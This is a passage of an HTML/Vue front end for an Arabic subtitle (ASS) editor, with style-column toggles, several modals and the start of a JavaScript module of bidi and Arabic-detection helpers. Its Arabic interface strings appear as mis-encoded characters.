                                <input type="checkbox" v-model="showColMarginL"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">MarginL</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColMarginR"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">MarginR</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColMarginV"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">MarginV</span>
                            </label>
                            <label class="inline-flex items-center gap-2 cursor-pointer select-none">
                                <input type="checkbox" v-model="showColEncoding"
                                    class="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 dark:bg-gray-700 dark:border-gray-600">
                                <span class="text-sm font-medium text-gray-700 dark:text-gray-300">Encoding</span>
                            </label>
                        </div>
                    </div>
                    <div class="p-4 overflow-y-auto flex-1">
                        <div v-if="styles.length === 0" class="text-center py-8 text-gray-500 dark:text-gray-400">
                            <p>ŸÑÿß ÿ™Ÿàÿ¨ÿØ ÿ£ŸÜŸÖÿßÿ∑ ŸÖÿ™ÿßÿ≠ÿ©</p>
                        </div>
                        <div v-else>
                            <!-- <div class="text-xs text-gray-500 dark:text-gray-400 mb-3 dir-ltr text-left">
                                Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding
                            </div> -->
                            <div class="overflow-x-auto">
                                <table class="w-full text-xs text-left dir-ltr">
                                    <thead>
                                        <tr class="border-b border-gray-200 dark:border-gray-700 text-base">
                                            <th class="py-2 px-2">Name</th>
                                            <th v-if="showColFontname" class="py-2 px-2">Fontname</th>
                                            <th v-if="showColFontsize" class="py-2 px-2">Fontsize</th>
                                            <th v-if="showColPrimaryColour" class="py-2 px-2">PrimaryColour</th>
                                            <th v-if="showColSecondaryColour" class="py-2 px-2">SecondaryColour</th>
                                            <th v-if="showColOutlineColour" class="py-2 px-2">OutlineColour</th>
                                            <th v-if="showColBackColour" class="py-2 px-2">BackColour</th>
                                            <th v-if="showColBold" class="py-2 px-2">Bold</th>
                                            <th v-if="showColItalic" class="py-2 px-2">Italic</th>
                                            <th v-if="showColUnderline" class="py-2 px-2">Underline</th>
                                            <th v-if="showColStrikeOut" class="py-2 px-2">StrikeOut</th>
                                            <th v-if="showColScaleX" class="py-2 px-2">ScaleX</th>
                                            <th v-if="showColScaleY" class="py-2 px-2">ScaleY</th>
                                            <th v-if="showColSpacing" class="py-2 px-2">Spacing</th>
                                            <th v-if="showColAngle" class="py-2 px-2">Angle</th>
                                            <th v-if="showColBorderStyle" class="py-2 px-2">BorderStyle</th>
                                            <th v-if="showColOutline" class="py-2 px-2">Outline</th>
                                            <th v-if="showColShadow" class="py-2 px-2">Shadow</th>
                                            <th v-if="showColAlignment" class="py-2 px-2">Alignment</th>
                                            <th v-if="showColMarginL" class="py-2 px-2">MarginL</th>
                                            <th v-if="showColMarginR" class="py-2 px-2">MarginR</th>
                                            <th v-if="showColMarginV" class="py-2 px-2">MarginV</th>
                                            <th v-if="showColEncoding" class="py-2 px-2">Encoding</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr v-for="(style, index) in styles" :key="index"
                                            class="border-b border-gray-100 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700 text-sm">
                                            <td class="py-2 px-2">{{ style.Name }}</td>
                                            <td v-if="showColFontname" class="py-2 px-2">{{ style.Fontname }}</td>
                                            <td v-if="showColFontsize" class="py-2 px-2">{{ style.Fontsize }}</td>
                                            <td v-if="showColPrimaryColour" class="py-2 px-2">{{ style.PrimaryColour }}</td>
                                            <td v-if="showColSecondaryColour" class="py-2 px-2">{{ style.SecondaryColour }}
                                            </td>
                                            <td v-if="showColOutlineColour" class="py-2 px-2">{{ style.OutlineColour }}</td>
                                            <td v-if="showColBackColour" class="py-2 px-2">{{ style.BackColour }}</td>
                                            <td v-if="showColBold" class="py-2 px-2">{{ style.Bold }}</td>
                                            <td v-if="showColItalic" class="py-2 px-2">{{ style.Italic }}</td>
                                            <td v-if="showColUnderline" class="py-2 px-2">{{ style.Underline }}</td>
                                            <td v-if="showColStrikeOut" class="py-2 px-2">{{ style.StrikeOut }}</td>
                                            <td v-if="showColScaleX" class="py-2 px-2">{{ style.ScaleX }}</td>
                                            <td v-if="showColScaleY" class="py-2 px-2">{{ style.ScaleY }}</td>
                                            <td v-if="showColSpacing" class="py-2 px-2">{{ style.Spacing }}</td>
                                            <td v-if="showColAngle" class="py-2 px-2">{{ style.Angle }}</td>
                                            <td v-if="showColBorderStyle" class="py-2 px-2">{{ style.BorderStyle }}</td>
                                            <td v-if="showColOutline" class="py-2 px-2">{{ style.Outline }}</td>
                                            <td v-if="showColShadow" class="py-2 px-2">{{ style.Shadow }}</td>
                                            <td v-if="showColAlignment" class="py-2 px-2">{{ style.Alignment }}</td>
                                            <td v-if="showColMarginL" class="py-2 px-2">{{ style.MarginL }}</td>
                                            <td v-if="showColMarginR" class="py-2 px-2">{{ style.MarginR }}</td>
                                            <td v-if="showColMarginV" class="py-2 px-2">{{ style.MarginV }}</td>
                                            <td v-if="showColEncoding" class="py-2 px-2">{{ style.Encoding }}</td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>

                            <!-- Override Tags Section -->
                            <div class="mt-8 border-t border-gray-200 dark:border-gray-700 pt-4" dir="rtl">
                                <h4 class="text-md font-semibold mb-4 text-gray-700 dark:text-gray-300">ÿπŸÑÿßŸÖÿßÿ™ ÿßŸÑÿ™ÿ¨ÿßŸàÿ≤
                                    ÿßŸÑŸÖŸÉÿ™ÿ¥ŸÅÿ© (Override Tags)</h4>
                                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                                    <!-- Fonts -->
                                    <div class="bg-gray-50 dark:bg-gray-900 p-3 rounded-lg">
                                        <h5 class="text-sm font-bold mb-2 text-primary-light dark:text-primary-dark">ÿßŸÑÿÆÿ∑Ÿàÿ∑
                                            (fn\)</h5>
                                        <div class="max-h-40 overflow-y-auto text-xs space-y-1" dir="ltr">
                                            <div v-if="overrideStats.fn.size === 0" class="text-gray-400">ŸÑÿß ŸäŸàÿ¨ÿØ</div>
                                            <div v-for="font in overrideStats.fn" :key="font" class="font-mono">{{ font }}
                                            </div>
                                        </div>
                                    </div>
                                    <!-- Sizes -->
                                    <div class="bg-gray-50 dark:bg-gray-900 p-3 rounded-lg">
                                        <h5 class="text-sm font-bold mb-2 text-primary-light dark:text-primary-dark">ÿßŸÑÿ£ÿ≠ÿ¨ÿßŸÖ
                                            (fs\)</h5>
                                        <div class="max-h-40 overflow-y-auto text-xs space-y-1" dir="ltr">
                                            <div v-if="overrideStats.fs.size === 0" class="text-gray-400">ŸÑÿß ŸäŸàÿ¨ÿØ</div>
                                            <div v-for="size in overrideStats.fs" :key="size" class="font-mono">{{ size }}
                                            </div>
                                        </div>
                                    </div>
                                    <!-- Colors -->
                                    <div class="bg-gray-50 dark:bg-gray-900 p-3 rounded-lg">
                                        <h5 class="text-sm font-bold mb-2 text-primary-light dark:text-primary-dark">ÿßŸÑÿ£ŸÑŸàÿßŸÜ
                                            (...c\, 1c\)</h5>
                                        <div class="max-h-40 overflow-y-auto text-xs space-y-1" dir="ltr">
                                            <div v-if="overrideStats.colors.size === 0" class="text-gray-400">ŸÑÿß ŸäŸàÿ¨ÿØ</div>
                                            <div v-for="color in overrideStats.colors" :key="color"
                                                class="font-mono flex items-center gap-2">
                                                <span>{{ color }}</span>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- Others -->
                                    <div class="bg-gray-50 dark:bg-gray-900 p-3 rounded-lg">
                                        <h5 class="text-sm font-bold mb-2 text-primary-light dark:text-primary-dark">ÿ£ÿÆÿ±Ÿâ
                                        </h5>
                                        <div class="max-h-40 overflow-y-auto text-xs space-y-1" dir="ltr">
                                            <div v-if="overrideStats.other.size === 0" class="text-gray-400">ŸÑÿß ŸäŸàÿ¨ÿØ</div>
                                            <div v-for="tag in overrideStats.other" :key="tag" class="font-mono">{{ tag }}
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Debug Modal -->
            <div v-if="showDebugModal"
                class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                <div class="bg-white dark:bg-gray-800 rounded-xl shadow-xl w-full max-w-2xl max-h-[80vh] flex flex-col">
                    <div class="p-4 border-b border-gray-200 dark:border-gray-700 flex items-center justify-between">
                        <h3 class="text-lg font-semibold">Debug Information</h3>
                        <button @click="showDebugModal = false"
                            class="text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 text-2xl">&times;</button>
                    </div>
                    <div class="p-4 overflow-y-auto">
                        <div v-if="debugLineInfo" class="space-y-4">
                            <div class="grid grid-cols-2 gap-4">
                                <div class="p-3 bg-gray-50 dark:bg-gray-900 rounded">
                                    <span class="font-bold block mb-1">ÿßŸÑŸÜÿµ:</span>
                                    <span class="font-mono text-sm break-all">{{ debugLineInfo.text }}</span>
                                </div>
                                <div class="p-3 bg-gray-50 dark:bg-gray-900 rounded">
                                    <span class="font-bold block mb-1">ÿßŸÑÿ≠ÿßŸÑÿ©:</span>
                                    <ul class="text-sm space-y-1">
                                        <li>isRTL: <span :class="debugLineInfo.isRTL ? 'text-green-500' : 'text-red-500'">{{
                                                debugLineInfo.isRTL }}</span></li>
                                        <li>isArabic: <span
                                                :class="debugLineInfo.isArabic ? 'text-green-500' : 'text-red-500'">{{
                                                debugLineInfo.isArabic }}</span></li>
                                        <li>hasRLE: <span
                                                :class="debugLineInfo.hasRLE ? 'text-green-500' : 'text-red-500'">{{
                                                debugLineInfo.hasRLE }}</span></li>
                                        <li>startRegex: <span
                                                :class="debugLineInfo.startRegex ? 'text-green-500' : 'text-red-500'">{{
                                                debugLineInfo.startRegex }}</span></li>
                                        <li>newlineRegex: <span
                                                :class="debugLineInfo.newlineRegex ? 'text-green-500' : 'text-red-500'">{{
                                                debugLineInfo.newlineRegex }}</span></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="p-3 bg-gray-50 dark:bg-gray-900 rounded">
                                <span class="font-bold block mb-1">ÿ±ŸÖŸàÿ≤ ÿßŸÑÿ£ÿ≠ÿ±ŸÅ:</span>
                                <div class="font-mono text-xs break-all">{{ debugLineInfo.charCodes }}</div>
                            </div>
                        </div>
                        <div v-else class="text-center text-gray-500">
                            ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ÿ≠ÿØŸäÿØ ÿ≥ÿ∑ÿ±.
                        </div>
                    </div>
                    <div class="p-4 border-t border-gray-200 dark:border-gray-700 flex justify-end">
                        <button @click="runDiagnostics"
                            class="mr-auto px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ™ÿ¥ÿÆŸäÿµ</button>
                        <button @click="updateDebugInfo"
                            class="mr-2 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600">ÿ™ÿ≠ÿØŸäÿ´</button>
                        <button @click="showDebugModal = false"
                            class="px-4 py-2 bg-gray-200 dark:bg-gray-700 rounded hover:opacity-90">ÿ•ÿ∫ŸÑÿßŸÇ</button>
                    </div>
                </div>
            </div>

            <!-- Bulk Convert Confirmation Modal -->
            <div v-if="showBulkConvertModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay">
                <div class="bg-white dark:bg-gray-800 rounded-xl shadow-xl max-w-lg w-full modal-content">
                    <div v-if="bulkConvertProgress === 0" class="p-6">
                        <div class="mb-4">
                            <div
                                class="w-12 h-12 mx-auto mb-4 rounded-full bg-blue-100 dark:bg-blue-900 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-600 dark:text-blue-400"
                                    fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                            </div>
                            <h3 class="text-lg font-semibold text-center text-gray-900 dark:text-white mb-2">
                                ÿ™ÿ£ŸÉŸäÿØ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ
                            </h3>
                            <p class="text-sm text-center text-gray-600 dark:text-gray-400">
                                ŸáŸÑ ÿ£ŸÜÿ™ ŸÖÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ™ÿ≠ŸàŸäŸÑ {{ bulkConvertTotal }} ÿ≥ÿ∑ÿ± ÿ•ŸÑŸâ {{ bulkConvertType === 'ltr' ? 'LTR' :
                                'RTL' }}ÿü
                            </p>
                        </div>
                        <div class="flex gap-3 justify-center">
                            <button @click="performBulkConversion"
                                class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-theme font-medium">
                                ŸÜÿπŸÖ
                            </button>
                            <button @click="cancelBulkConversion"
                                class="px-4 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:opacity-90 transition-theme font-medium">
                                ÿ•ŸÑÿ∫ÿßÿ°
                            </button>
                        </div>
                    </div>
                    <div v-else-if="!bulkConvertSuccess" class="p-6">
                        <div
                            class="bg-white dark:bg-gray-800 rounded-xl p-4 shadow-sm border border-gray-200 dark:border-gray-700 mb-4">
                            <div class="flex items-center justify-between mb-2">
                                <h3 class="text-sm font-semibold text-gray-700 dark:text-gray-300">ÿ™ŸÇÿØŸÖ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ</h3>
                                <span class="text-sm text-gray-500 dark:text-gray-400">{{ bulkConvertTotal ? Math.round((bulkConvertProgress /
                                    bulkConvertTotal) * 100) : 0 }}%</span>
                            </div>
                            <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-3">
                                <div class="bg-rtl-light dark:bg-rtl-dark h-3 rounded-full transition-all duration-300"
                                    :style="{ width: (bulkConvertTotal ? (bulkConvertProgress / bulkConvertTotal) * 100 : 0) + '%' }"></div>
                            </div>
                            <div class="mt-2 text-xs text-gray-500 dark:text-gray-400 text-center">
                                ÿ™ŸÖ ÿ™ÿ≠ŸàŸäŸÑ {{ bulkConvertProgress }} ŸÖŸÜ {{ bulkConvertTotal }} ÿ≥ÿ∑ÿ±
                            </div>
                        </div>
                        <div v-if="bulkConvertProgress < bulkConvertTotal"
                            class="text-center text-sm text-gray-500 dark:text-gray-400">
                            ÿ¨ÿßÿ±Ÿä ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ...
                        </div>
                    </div>
                    <div v-else class="p-6">
                        <div class="mb-4">
                            <div
                                class="w-12 h-12 mx-auto mb-4 rounded-full bg-green-100 dark:bg-green-900 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-600 dark:text-green-400"
                                    fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M5 13l4 4L19 7" />
                                </svg>
                            </div>
                            <h3 class="text-lg font-semibold text-center text-gray-900 dark:text-white mb-2">
                                ÿ™ŸÖ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ ÿ®ŸÜÿ¨ÿßÿ≠
                            </h3>
                            <p class="text-sm text-center text-gray-600 dark:text-gray-400 mb-4">
                                ÿ™ŸÖ ÿ™ÿ≠ŸàŸäŸÑ {{ bulkConvertTotal }} ÿ≥ÿ∑ÿ± ÿ•ŸÑŸâ {{ bulkConvertType === 'ltr' ? 'LTR' : 'RTL' }}
                            </p>
                            <div class="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 space-y-2">
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">ÿßŸÑÿ£ÿ≥ÿ∑ÿ± ÿßŸÑŸÖÿ≠ŸàŸÑÿ© ÿ®ŸÜÿ¨ÿßÿ≠:</span>
                                    <span class="font-semibold text-green-600 dark:text-green-400">{{
                                        bulkConvertSuccessCount }}</span>
                                </div>
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">ÿßŸÑÿ£ÿ≥ÿ∑ÿ± ÿßŸÑÿ™Ÿä ŸÅÿ¥ŸÑ ÿ™ÿ≠ŸàŸäŸÑŸáÿß:</span>
                                    <span class="font-semibold text-red-600 dark:text-red-400">{{ bulkConvertFailureCount
                                        }}</span>
                                </div>
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">ŸÜŸàÿπ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ:</span>
                                    <span class="font-semibold text-gray-900 dark:text-white">{{ bulkConvertType === 'ltr' ?
                                        'LTR' : 'RTL' }}</span>
                                </div>
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">{{ bulkConvertType === 'rtl' ? 'ÿ•ÿ¨ŸÖÿßŸÑŸä ÿ£ÿ≥ÿ∑ÿ± LTR:' : 'ÿ•ÿ¨ŸÖÿßŸÑŸä ÿ£ÿ≥ÿ∑ÿ± RTL:' }}</span>
                                    <span class="font-semibold text-gray-900 dark:text-white">{{ bulkConvertTotal }}</span>
                                </div>
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ÿ±ŸÇ:</span>
                                    <span class="font-semibold text-gray-900 dark:text-white">{{
                                        bulkConvertDuration.toFixed(2) }} ÿ´ÿßŸÜŸäÿ©</span>
                                </div>
                                <div class="flex justify-between text-sm">
                                    <span class="text-gray-600 dark:text-gray-400">ŸÖÿ™Ÿàÿ≥ÿ∑ ÿßŸÑÿ≥ÿ±ÿπÿ©:</span>
                                    <span class="font-semibold text-gray-900 dark:text-white">{{ bulkConvertSpeed }}
                                        ÿ≥ÿ∑ÿ±/ÿ´ÿßŸÜŸäÿ©</span>
                                </div>
                            </div>
                        </div>
                        <button @click="closeBulkConvertModal"
                            class="w-full px-4 py-2 bg-rtl-light dark:bg-rtl-dark text-white rounded-lg hover:opacity-90 transition-theme font-medium">
                            ÿ•ÿ∫ŸÑÿßŸÇ
                        </button>
                    </div>
                </div>
            </div>
            <div v-if="showResetConfirmModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-overlay">
                <div class="bg-white dark:bg-gray-800 rounded-xl shadow-xl max-w-lg w-full modal-content">
                    <div class="p-6">
                        <div class="mb-4">
                            <div class="w-12 h-12 mx-auto mb-4 rounded-full bg-rose-100 dark:bg-rose-900 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-rose-600 dark:text-rose-400"
                                    fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M12 9v2m0 4h.01M12 3a9 9 0 100 18 9 9 0 000-18z" />
                                </svg>
                            </div>
                            <h3 class="text-lg font-semibold text-center text-gray-900 dark:text-white mb-2">
                                ÿ™ÿ£ŸÉŸäÿØ ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ∂ÿ®ÿ∑
                            </h3>
                            <p class="text-sm text-center text-gray-600 dark:text-gray-400">
                                ŸáŸÑ ÿ£ŸÜÿ™ ŸÖÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ•ÿπÿßÿØÿ© ÿ∂ÿ®ÿ∑ ŸÖŸÑŸÅ ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ© ÿ•ŸÑŸâ ÿßŸÑÿ≠ÿßŸÑÿ© ÿßŸÑÿ£ÿµŸÑŸäÿ©ÿü ÿ≥Ÿäÿ™ŸÖ ŸÅŸÇÿØÿßŸÜ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ™ÿπÿØŸäŸÑÿßÿ™ ÿßŸÑÿ≠ÿßŸÑŸäÿ©.
                            </p>
                        </div>
                        <div class="flex gap-3 justify-center">
                            <button @click="confirmResetToOriginal"
                                class="px-4 py-2 bg-rose-600 hover:bg-rose-700 text-white rounded-lg transition-theme font-medium">
                                ŸÜÿπŸÖ
                            </button>
                            <button @click="cancelResetToOriginal"
                                class="px-4 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:opacity-90 transition-theme font-medium">
                                ÿ•ŸÑÿ∫ÿßÿ°
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Dummy Video Options Modal -->
            <div v-show="dummyVideo.showOptions" v-cloak style="display:none" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black bg-opacity-50 backdrop-blur-sm" role="dialog" aria-modal="true">
                <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-xl w-full max-w-md overflow-hidden transform transition-all">
                    <div class="px-6 py-4 border-b border-gray-100 dark:border-gray-700 flex justify-between items-center">
                        <h3 class="text-lg font-bold text-gray-900 dark:text-white flex items-center gap-2">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-primary-light dark:text-primary-dark" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            </svg>
                            ÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑÿ™ÿ¨ÿ±Ÿäÿ®Ÿä
                        </h3>
                        <button @click="dummyVideo.showOptions = false" class="text-gray-400 hover:text-gray-500 dark:hover:text-gray-300 transition-colors">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </button>
                    </div>
                    
                    <div class="p-6 space-y-6">
                        <!-- Resolution -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">ÿ£ÿ®ÿπÿßÿØ ÿßŸÑŸÅŸäÿØŸäŸà</label>
                            <div class="flex items-center gap-2">
                                <input type="number" v-model.number="dummyVideo.width" class="w-full px-3 py-2 bg-gray-50 dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-primary-light dark:focus:ring-primary-dark focus:border-transparent outline-none text-center" placeholder="ÿßŸÑÿπÿ±ÿ∂">
                                <span class="text-gray-500">√ó</span>
                                <input type="number" v-model.number="dummyVideo.height" class="w-full px-3 py-2 bg-gray-50 dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-primary-light dark:focus:ring-primary-dark focus:border-transparent outline-none text-center" placeholder="ÿßŸÑÿßÿ±ÿ™ŸÅÿßÿπ">
                            </div>
                            <p class="mt-1 text-xs text-gray-500 dark:text-gray-400">ÿßŸÑÿßŸÅÿ™ÿ±ÿßÿ∂Ÿä: 1920 √ó 1080 (FHD)</p>
                        </div>

                        <!-- Color -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">ŸÑŸàŸÜ ÿßŸÑÿÆŸÑŸÅŸäÿ©</label>
                            <div class="flex items-center gap-3">
                                <input type="color" v-model="dummyVideo.color" class="h-10 w-20 p-1 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded cursor-pointer">
                                <span class="text-sm text-gray-600 dark:text-gray-400 font-mono">{{ dummyVideo.color }}</span>
                            </div>
                        </div>

                        <!-- Duration -->
                        <div>
                            <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">ŸÖÿØÿ© ÿßŸÑŸÅŸäÿØŸäŸà (ÿ®ÿßŸÑŸÖŸÑŸÑŸä ÿ´ÿßŸÜŸäÿ©)</label>
                            <div class="relative">
                                <input type="number" v-model.number="dummyVideo.customDuration" 
                                    placeholder="ÿßÿ™ÿ±ŸÉŸá ŸÅÿßÿ±ÿ∫ÿßŸã ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÖÿØÿ© ŸÖŸÑŸÅ ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©"
                                    class="w-full px-3 py-2 bg-gray-50 dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-primary-light dark:focus:ring-primary-dark focus:border-transparent outline-none">
                                <button v-if="dummyVideo.customDuration !== null" @click="dummyVideo.customDuration = null" 
                                    class="absolute left-2 top-1/2 transform -translate-y-1/2 text-xs text-primary-light dark:text-primary-dark hover:underline">
                                    ÿßÿ≥ÿ™ÿπÿßÿØÿ© ÿßŸÑÿßŸÅÿ™ÿ±ÿßÿ∂Ÿä
                                </button>
                            </div>
                            <p class="mt-1 text-xs text-gray-500 dark:text-gray-400">
                                ÿßŸÑŸÖÿØÿ© ÿßŸÑŸÖÿ≠ÿ≥Ÿàÿ®ÿ© ŸÖŸÜ ÿßŸÑŸÖŸÑŸÅ: {{ formatTime(fileMaxDuration) }}
                            </p>
                        </div>
                    </div>

                    <div class="px-6 py-4 bg-gray-50 dark:bg-gray-900/50 flex justify-end gap-3">
                        <button @click="dummyVideo.showOptions = false" class="px-4 py-2 text-gray-700 dark:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-lg transition-colors font-medium">
                            ÿ•ŸÑÿ∫ÿßÿ°
                        </button>
                        <button @click="saveDummyOptions" class="px-4 py-2 bg-primary-light dark:bg-primary-dark text-white rounded-lg hover:opacity-90 transition-opacity font-medium shadow-sm">
                            ÿ≠ŸÅÿ∏
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <script type="module">
            import SubtitlesOctopus from 'https://cdn.jsdelivr.net/npm/libass-wasm@4.1.0/+esm';
            const RLE = '\u202B';

            function containsArabic(text) {
                // Includes Arabic, Arabic Supplement, Arabic Extended-A, Arabic Presentation Forms-A/B
                const arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
                return arabicRegex.test(text);
            }

            const LEADING_NEUTRAL_CHARS_REGEX = /^[\s\u061C\u200E\u200F!"#$%&'()*+,\-./:;<=>?@\[\\\]^_`{|}~ÿåÿõÿü¬´¬ªŸÄ‚Ä¶]+/;

            // Bidi control characters
            const BIDI_CONTROLS = /[\u202A-\u202E\u200E\u200F\u061C]/;

            function startsWithRLEAfterTagsAndNeutrals(segment) {
                if (!segment || typeof segment !== 'string') return false;

                const tagsMatch = segment.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = segment.slice(tagPrefix.length);

                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                const neutralPrefix = neutralMatch ? neutralMatch[0] : '';
                rest = rest.slice(neutralPrefix.length);

                return rest.startsWith(RLE);
            }

            function hasBidiNeutralAtStart(text) {
                if (!text || typeof text !== 'string') return false;

                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);

                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                if (!neutralMatch) return false;

                rest = rest.slice(neutralMatch[0].length);
                return containsArabic(rest);
            }

            function hasTrailingNeutralWithArabic(text) {
                if (!text || typeof text !== 'string') return false;

                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);

                if (!containsArabic(rest)) return false;
                if (/\{[^{}]*\\alpha&HFF[^{}]*\}\s*[!.?‚Ä¶ÿå.]+$/.test(rest)) return false;
                rest = rest.replace(/[\s\u061C\u200E\u200F"¬´¬ª‚Äú‚Äù‚Äû'`]+$/, '');
                return /[!.?‚Ä¶ÿå:]$/.test(rest);
            }

            function startsWithTag(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                return tagPrefix.length > 0;
            }

            function startsWithNumericList(text) {
